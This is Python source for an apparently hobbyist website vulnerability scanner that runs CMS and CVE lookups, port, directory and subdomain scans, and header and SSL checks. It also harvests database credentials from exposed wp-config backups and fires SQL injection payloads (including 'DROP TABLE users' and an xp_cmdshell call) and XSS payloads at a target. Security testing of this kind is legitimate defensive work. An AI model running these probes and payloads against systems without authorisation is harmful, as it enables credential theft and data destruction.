# Site-Scanner - Website Vulnerability Assessment Tool.
# Version: 1.8.0
# Date: Jul 13, 2024
# Copyrights © Tal.M

import requests, time,socket,concurrent.futures
import json, re, signal, sys, ssl
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
import datetime

def signal_handler(sig, frame):
    print("\nShutting down...")
    time.sleep(1)
    exit(1)

def print_logo():
    with open("src/logo.txt", "r") as logo_file:
        logo = logo_file.read()
        print(logo)


def get_url():
    while True:
        try:
            url = input('\nEnter URL: ').strip()  # Remove leading/trailing whitespace
            if not url:
                print('\033[31mError:\033[0m URL cannot be empty.')
                continue
            if not url.startswith(('http://', 'https://')):
                print('\033[31mError:\033[0m URL must start with http:// or https://')
                continue
            if url.endswith('/'):
                url = url[:-1]  # Remove trailing slash
            return url
        except KeyboardInterrupt:
            print("\n\nShutting down...")
            time.sleep(1)
            exit(0)
        except Exception as e:
            print('\033[31mAn error occurred:\033[0m', e)

def load_cms_metadata(json_file):
    with open(json_file, "r") as file:
        return json.load(file)

def detect_cms_and_version(url, cms_metadata):
    response = requests.get(url)
    if response.status_code == 200:
        html_content = response.text
        detected_cms, detected_version = "Unknown CMS", None
        
        for cms, metadata in cms_metadata.items():
            indicators = metadata.get("identification", {}).get("indicators", [])
            version_indicators = metadata.get("version_detection", {}).get("indicators", [])
            
            for indicator in indicators:
                if re.search(indicator, html_content, re.I):
                    detected_cms = cms
                    break
            
            for version_indicator in version_indicators:
                version_match = re.search(version_indicator, html_content)
                if version_match:
                    detected_version = version_match.group(1)
                    break

            if detected_cms and detected_version:
                break

        return detected_cms, detected_version
    else:
        print(f"Error: Unable to fetch URL: {url}")
        return None, None


def find_wp_config_backup(base_url):
    try:
        wp_config_backup_url = urljoin(base_url, "/wp-config.php-bak")

        # Fetch the content of the wp-config.php.bak file
        response = requests.get(wp_config_backup_url)
        if response.status_code == 200:
            
            print("\n\033[31m[+] Major Leak Found!\033[0m\n")
            # Extract database configuration information
            wp_config_content = response.text
            db_name = wp_config_content.split("DB_NAME', '")[1].split("'")[0]
            db_user = wp_config_content.split("DB_USER', '")[1].split("'")[0]
            db_password = wp_config_content.split("DB_PASSWORD', '")[1].split("'")[0]
            db_host = wp_config_content.split("DB_HOST', '")[1].split("'")[0]
            # Print the database configuration information
            print(f"Database Name: {db_name}")
            print(f"Database User: {db_user}")
            print(f"Database Password: {db_password}")
            print(f"Database Host: {db_host}")
            print(f"\nFor more info: {wp_config_backup_url}")
            
    except requests.RequestException as e:
        print(f"Error fetching URL {wp_config_backup_url}: {e}")

    

def search_vulnerabilities(cms, version,url):
    if version:
        major_minor_version = ".".join(version.split(".")[:2])
        search_query = f"{cms}+{major_minor_version}"
    else:
        major_minor_version = ""
        search_query = f"{cms}"
        
    search_url = f"https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword={search_query}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }

    if cms_name=="WordPress":
                find_wp_config_backup(url)
    
    try:
        response = requests.get(search_url, headers=headers)
        response.raise_for_status()  # Raise an exception for non-200 status codes
        
        soup = BeautifulSoup(response.text, 'html.parser')
        cve_info = soup.find("div", class_="smaller", style="background-color:#e0dbd2; padding:3px; border:1px solid #706c60; margin-bottom:10px")
        
        if cve_info:
            cve_count = cve_info.find("b").text.strip()
            return f"\n\033[31m{cve_count}\033[0m CVE Records found for {cms} {major_minor_version}\nSee more at {search_url}"
        else:
            return f"\nNo CVE Records found for {cms} {major_minor_version}."
        
    except requests.RequestException as e:
        return f"Error: {str(e)}"

def search_login_variations(cms_name, url, cms_metadata):
    cms_info = cms_metadata.get(cms_name, {})  # Use the original CMS name without lowercasing

    login_pages = cms_info.get("login_pages", [])

    valid_login_page = None
    for page in login_pages:
        response = requests.get(f"{url}{page}")
        if response.status_code == 200:
            valid_login_page = f"{url}{page}"
            break
    if valid_login_page:
        print("\n[-] " + valid_login_page)
    else:
        print("\n[-] Login page not found")


def get_ip(url):
    try:
        parsed_url = urlparse(url)
        domain = parsed_url.netloc
        ip_address = socket.gethostbyname(domain)
        return ip_address
    except Exception as e:
        print("Error:", e)
        return "N/A"

def get_server_info(res):
    try:
        response = res
        end_time = time.time()
        ip_address = get_ip(url)
        if response.status_code == 200:
            # Load Time Calculation.
            load_time = end_time - start_time
            server_headers = response.headers
            server = server_headers.get('Server', 'N/A')
            os = server_headers.get('X-Powered-By', 'N/A')

            print(f"\n\033[31mLoad Time:\033[0m {load_time:.1f} seconds")
            print(f"\033[31mIP Address:\033[0m {ip_address}")
            print(f"\033[31mServer Software:\033[0m {server}")
            print(f"\033[31mServer OS:\033[0m {os}")
        else:
            print('Failed to fetch URL:', response.status_code)
            time.sleep(1)
            exit(1)
    except requests.exceptions.RequestException as e:
        print("Error:", e)

def scan_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((ip, port))
    sock.close()
    if result == 0:
        return port

def get_open_ports(ip_address):

    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        future_to_port = {executor.submit(scan_port, ip_address, port): port for port in range(1, 1024)}
        for future in concurrent.futures.as_completed(future_to_port):
            port = future_to_port[future]
            if future.result() is not None:
                open_ports.append(port)

    return open_ports

def check_xss_vulnerability(url):
    payloads = [
        "<script>alert('XSS Vulnerable');</script>",
        "<img src='x' onerror='alert(\"XSS Vulnerable\")'>",
        "<a href='javascript:alert(\"XSS Vulnerable\")'>Click me</a>"
    ]
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}

    response = requests.get(url, headers=headers)

    if response.status_code != 200:
        print("Failed to fetch the URL. Status Code:", response.status_code)
        return

    soup = BeautifulSoup(response.text, 'html.parser')

    # Testing input fields
    input_fields = soup.find_all('input')
    found_vulnerabilities = False

    for field in input_fields:
        for payload in payloads:
            data = {field.get('name'): payload}
            test_url = urljoin(url, field.get('action') or '') 
            test_response = requests.post(test_url, data=data, headers=headers)

            if payload in test_response.text:
                found_vulnerabilities = True
                print("Potential XSS vulnerability found in:", test_url)
                print("Payload:", payload)

    # Testing JS event attributes
    script_tags = soup.find_all(string=re.compile(r'on\w+=".*?"'))
    for tag in script_tags:
        for payload in payloads:
            test_url = urljoin(url, tag)
            test_response = requests.get(test_url, headers=headers)

            if payload in test_response.text:
                found_vulnerabilities = True
                print("Potential XSS vulnerability found in:", test_url)
                print("Payload:", payload)

    # Testing URL parameters
    for payload in payloads:
        test_url = url + "?" + payload
        test_response = requests.get(test_url, headers=headers)

        if payload in test_response.text:
            found_vulnerabilities = True
            print("Potential XSS vulnerability found in:", test_url)
            print("Payload:", payload)

    # No vulnerabilities found
    if not found_vulnerabilities:
        print("No XSS Vulnerabilities found.")

def is_valid_url(url):
    response = requests.head(url)
    return response.status_code == 200

def generate_test_urls(domain, patterns_file):
    test_urls = []

    # Read patterns from the JSON file
    with open(patterns_file, 'r') as file:
        patterns = json.load(file)

    # Generate variations based on patterns
    for pattern in patterns:
        full_url = urljoin(domain, pattern)

        # Check if the generated URL is valid
        test_urls.append(full_url)

    return test_urls

def sql_injection_vulnerability(url):
    payloads = [
        "'"
        "1' OR '1'='1",
        "1' OR '1'='1' --",
        "1' OR '1'='1' #",
        "1' OR '1'='1'/*",
        "1' OR '1'='1'/*",
        "1; DROP TABLE users --",
        "' OR 'x'='x",
        "UNION SELECT null, username, password FROM users --",
        "UNION ALL SELECT null, version(), database() --",

        "1' AND 1=convert(int, @@version) --",
        "' AND 1=convert(int, @@version) --",

        "1' WAITFOR DELAY '0:0:5' --",

        "1' AND 1=1 --",
        "1' AND 1=2 --",

        "1' UNION SELECT null, version(), null --",
        "1' UNION SELECT null, database(), null --",

        "1'; EXEC xp_cmdshell('nslookup example.com') --",

        "1' AND SLEEP(5) --",
        "1' AND 1=1; IF (1=1) WAITFOR DELAY '0:0:5' --",

        "1' AND IF(1=1, SLEEP(5), 0) --",
        "1' AND IF(1=1, BENCHMARK(5000000, SHA1(1)), 0) --"
    ]

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
    test_urls = generate_test_urls(url, "src/patterns.json")

    for test_url in test_urls:
        for payload in payloads:
            full_url = f"{test_url}{payload}" if '?' in test_url else f"{test_url}?param={payload}"
            response = requests.get(full_url, headers=headers)

            if "error" in response.text.lower() and response.status_code == 200 or "syntax error" in response.text.lower():
                print("SQL injection vulnerability found in:", test_url)
                print("Payload:", payload)

                # Printing the error message.
                soup = BeautifulSoup(response.text, 'html.parser')
                error_tag = soup.find(string=lambda text: "error" in text.lower() or "syntax error" in text.lower())
                if error_tag:
                    error_message = error_tag.strip()
                    print("Error message:", error_message)
                return 


def robots_txt(url):
    try:
        parsed_url = urlparse(url)
        robots_url = f"{parsed_url.scheme}://{parsed_url.netloc}/robots.txt"
        response = requests.get(robots_url)
        if response.status_code == 200:
            print("\n[+] Fetching robots.txt...\n")
            for line in response.text.split('\n'):
                if line.strip().startswith('Disallow:'):
                    print(line.strip())
        else:
            print("\nFailed to fetch robots.txt. Status Code:", response.status_code)
    except Exception as e:
        print("Error:", e)


def refactor_url(url):
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    if url == base_url:
        return url
    print(f"Specefied URL: {url}\n")
    print(f"1. Stripped URL: {base_url}")
    print("2. Enter new URL")
    print(f"3. Continue with: {url}")
    user = input("\nEnter your selection: ")
    if user == '1':
        url = base_url
    if user == '2':
        url = get_url()
    return url

def check_directory(url, directory):
    full_url = url.rstrip('/') + '/' + directory
    try:
        response = requests.get(full_url, timeout=5)
        if response.status_code in [200, 204, 301, 302, 307, 401]:
            return (full_url, response.status_code)
    except requests.exceptions.RequestException:
        pass

def search_directories(url, wordlist_path):
    with open(wordlist_path, 'r') as f:
        directories = f.read().splitlines()


    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_directory = {executor.submit(check_directory, url, directory): directory for directory in directories}
        for future in concurrent.futures.as_completed(future_to_directory):
            result = future.result()
            if result:
                print(f"[+] {result[0]} (Status: {result[1]})")

    return

def check_security_headers(url):
    headers_to_check = [
    "Content-Security-Policy",
    "X-Content-Type-Options",
    "X-Frame-Options",
    "Strict-Transport-Security",
    "X-XSS-Protection",
    "Referrer-Policy",
    "Feature-Policy",
    "Expect-CT",
    "Content-Encoding",
    "Permissions-Policy",
    "Cache-Control"
    ]   
    
    response = requests.get(url)
    missing_headers = []

    for header in headers_to_check:
        if header not in response.headers:
            missing_headers.append(f"[+] {header}")
    
    if missing_headers:
        missing_headers_str = '\n'.join(missing_headers)
        print(f"Missing security headers for {url}:\n{missing_headers_str}")
    else:
        print(f"All security headers are present for {url}")

def check_subdomain(scheme, base_url, subdomain):
    full_url = f"{scheme}://{subdomain}.{base_url}"
    try:
        response = requests.get(full_url, timeout=5)
        if response.status_code == 200:
            return full_url, response.status_code
    except requests.RequestException:
        return None

def search_subdomains(url, wordlist_path):
    parsed_url = urlparse(url)
    scheme = parsed_url.scheme
    base_url = parsed_url.netloc

    with open(wordlist_path, 'r') as f:
        subdomains = f.read().splitlines()

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        future_to_subdomain = {executor.submit(check_subdomain, scheme, base_url, subdomain): subdomain for subdomain in subdomains}
        for future in concurrent.futures.as_completed(future_to_subdomain):
            result = future.result()
            if result:
                print(f"[+] {result[0]} (Status: {result[1]})")


def check_ssl_certificate(url):
    if url.startswith("https://"):
        url = url.replace("https://", "")
    else:
        print("URL must start with https://")
        return
    try:
        context = ssl.create_default_context()
        with context.wrap_socket(socket.socket(), server_hostname=url) as sock:
            sock.settimeout(5)  # Adjust timeout as needed
            sock.connect((url, 443))  # Connect to the website's HTTPS port
            ssl_info = sock.getpeercert()

            # Extract relevant certificate information
            issuer_info = ssl_info['issuer']
            country = issuer_info[0][0][1] if len(issuer_info[0]) > 0 else 'N/A'
            organization = issuer_info[1][0][1] if len(issuer_info[1]) > 0 else 'N/A'
            common_name = issuer_info[2][0][1] if len(issuer_info[2]) > 0 else 'N/A'
            expiration_date = datetime.datetime.strptime(ssl_info['notAfter'], "%b %d %H:%M:%S %Y %Z")

            # Check validity and expiration
            current_date = datetime.datetime.now()
            days_until_expire = (expiration_date - current_date).days

            # Print SSL/TLS Certificate Information
            print(f"[+] Issuer: Country:{country}, Org:{organization}, Name:{common_name}")
            print(f"[+] Expiration Date: {expiration_date.strftime('%Y-%m-%d')}")
            print(f"[+] Days until Expiry: {days_until_expire}")

    except ssl.SSLError as e:
        print(f"\nError checking SSL/TLS certificate for {url}: {str(e)}")
    except Exception as e:
        print(f"\nError: {str(e)}")


def print_menu():
    print("\n\033[31m1.CMS Detection & Vulnerability Report\033[0m")
    print("\033[31m2.Admin Panel Auth Detection\033[0m")
    print("\033[31m3.Robots.txt Disallowed\033[0m")
    print("\033[31m4.Check Security Headers\033[0m")
    print("\033[31m5.Validate SSL Certificate\033[0m")
    print("\033[31m6.Open Ports Scan\033[0m - Heavy Op")
    print("\033[31m7.Scanning Directories\033[0m")
    print("\033[31m8.Scanning Subdomains\033[0m")
    print("\033[31m9.SQL Injection Detection\033[0m")
    print("\033[31m10.XSS Detection\033[0m")
    print("\033[31m0.Exit\033[0m")


if __name__ == '__main__':
    print_logo()
    url = get_url() 

    print("\nFetching URL...")
    start_time = time.time()
    response = requests.get(url)
    get_server_info(response)

    # Reducing load by importing files in the main stack.
    cms_metadata = load_cms_metadata("src/cms_metadata.json")

    #Init value if CMS Detection skipped.
    cms_name = "Unknown CMS"

    while True:
        signal.signal(signal.SIGINT, signal_handler)
        print_menu()
        user = input("\033[32mSelect Task:\033[0m")
        # Switch case tasks
        if user == "1":
            print(f"\n[+] Detecting CMS...")
            cms_name, cms_version = detect_cms_and_version(url, cms_metadata)
            print("\nDetected CMS:", cms_name)
            if cms_version != None:
                print("Detected Version:", cms_version)    
            if cms_name != "Unknown CMS":
                print("\n[+] Searching Vulnerabilities")
                print(search_vulnerabilities(cms_name, cms_version, url))
            
        if user == "2":
            print("\n[+] Detecting Admin Panel Auth...")
            search_login_variations(cms_name, url,cms_metadata)

        if user == "3":
            robots_txt(url)
    
        if user == "4":
            print("\n[+] Checking Security Headers...\n")
            check_security_headers(url)

        if user == "5":
            print(url)
            print("\n[+] Checking SSL Certificate...\n")
            check_ssl_certificate(url)

        if user == "6":
            print("\n[+] Scanning Ports...\n")
            print(get_open_ports(get_ip(url)))
            
        if user == "7":
            print("\n[+] Scanning Directories...\n")
            wordlist_path = "src/dir.txt"
            url = refactor_url(url)
            # Extract base URL up to the domain suffix
            search_directories(url, wordlist_path)
        
        if user == "8":
            print("\n[+] Scanning Subdomains...\n")
            wordlist_path = "src/sub.txt"
            url = refactor_url(url)
            # Extract base URL up to the domain suffix
            search_subdomains(url, wordlist_path)

        if user == "9":
            print("\n[+] Looking for SQL Injection Vulnerabilities...")
            sql_injection_vulnerability(url)

        if user == "10":
            print("\n[+] Looking for XSS Vulnerabilities...")
            check_xss_vulnerability(url)

        if user == "0":
            print("\nShutting down...")
            time.sleep(1)
            exit(1)
